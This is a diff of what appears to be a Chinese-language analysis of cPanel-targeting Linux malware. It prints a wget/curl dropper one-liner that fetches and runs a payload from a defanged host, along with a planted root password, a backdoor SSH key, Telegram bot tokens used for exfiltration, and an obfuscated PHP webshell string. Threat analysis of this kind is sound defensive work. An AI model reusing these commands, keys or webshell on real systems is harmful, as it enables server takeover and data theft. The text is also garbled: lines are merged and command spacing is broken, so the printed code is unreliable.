@@ -9,7 +9,8 @@ MD5: fb1bc3f935fdeb3555465070ba2db33cMagic: ELF64-bit LSB executable, x86-64, ve
 
 修该密码 & 植入SSH 公钥，对应的处理函数分别为main_changeRootPassword和main_installSSHKey
 
-root:123Qwe123C
+root:
+123Qwe123C
 
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFIswJUfqrkbm2sIMfNHZn1sOYkxjNzEynqJKFU7qoez cpanel-updater
 
@@ -31,78 +32,39 @@ https://cp.dene.de[.]com/login.jshttps::/cp.dena.de[.]com/login.tmpl
 
 敏感信息回传至回传到Telegram，对应的处理函数为main_sendTelegram或main_sendTelegramFile
 
-1190043163:AAEy1FDoB_r8KFiOIqsEpgDQ2k78Ai6BdWk
+1190043163:
+AAEy1FDoB_r8KFiOIqsEpgDQ2k78Ai6BdWk
 
-1190043163:AAFtaUfpui9fqKoRnqOa5XvT6MHLcK1axiU
+1190043163:
+AAFtaUfpui9fqKoRnqOa5XvT6MHLcK1axiU
 
-MD5:9305b4ebbb4d39907cf36b62989a6af3MAGIC: ELF64-bit LSB executable, x86-64, version1(SYSV), statically linked, strippedName: filemanager-linux-amd64
+MD5:
+9305b4ebbb4d39907cf36b62989a6af3MAGIC: ELF64-bit LSB executable, x86-64, version1(SYSV), statically linked, strippedName: filemanager-linux-amd64
 
-MD5:2286f126ab4740ccf2595ad1fa0c615cMagic:PHP script textName:helper.php
+MD5:
+2286f126ab4740ccf2595ad1fa0c615cMagic:
+PHP script textName:
+helper.php
 
 $___= ("8"^"K") .("8"^"L") . ("8"^"J") .("v"^")") . ("8"^"J") .("T"^";") . ("8"^"L") .("W"^"f") . ("R"^"a");
 
 
 ```
 F=/root/.u$$;(wget -q -O"$F"'https://cp.dene.de[.]com/Update'2>/dev/null||curl -sk -o"$F"'https://cp.dene.de[.]com/Update')&&chmod755"$F"&& (nohup"$F"-s >/dev/null 2>&1 &)&&sleep2;rm-f"$F"
-```
-
-
-
-```
 MD5: fb1bc3f935fdeb3555465070ba2db33cMagic: ELF64-bit LSB executable, x86-64, version1(SYSV), statically linked, strippedFileName: Update
-```
-
-
-
-```
-root:123Qwe123C
-```
-
-
-
-```
+root:
+123Qwe123C
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFIswJUfqrkbm2sIMfNHZn1sOYkxjNzEynqJKFU7qoez cpanel-updater
-```
-
-
-
-```
 https://cp.dene.de[.]com/cpanel.py
-```
-
-
-
-```
 /usr/local/cpanel/cgi-sys/cpanel.py
-```
-
-
-
-```
 https://cp.dene.de[.]com/login.jshttps::/cp.dena.de[.]com/login.tmpl
-```
-
-
-
-```
 /usr/local/cpanel/base/unprotected/cpanel
-```
-
-
-
-```
-MD5:9305b4ebbb4d39907cf36b62989a6af3MAGIC: ELF64-bit LSB executable, x86-64, version1(SYSV), statically linked, strippedName: filemanager-linux-amd64
-```
-
-
-
-```
-MD5:2286f126ab4740ccf2595ad1fa0c615cMagic:PHP script textName:helper.php
-```
-
-
-
-```
+MD5:
+9305b4ebbb4d39907cf36b62989a6af3MAGIC: ELF64-bit LSB executable, x86-64, version1(SYSV), statically linked, strippedName: filemanager-linux-amd64
+MD5:
+2286f126ab4740ccf2595ad1fa0c615cMagic:
+PHP script textName:
+helper.php
 $___= ("8"^"K") .("8"^"L") . ("8"^"J") .("v"^")") . ("8"^"J") .("T"^";") . ("8"^"L") .("W"^"f") . ("R"^"a");
 ```
 
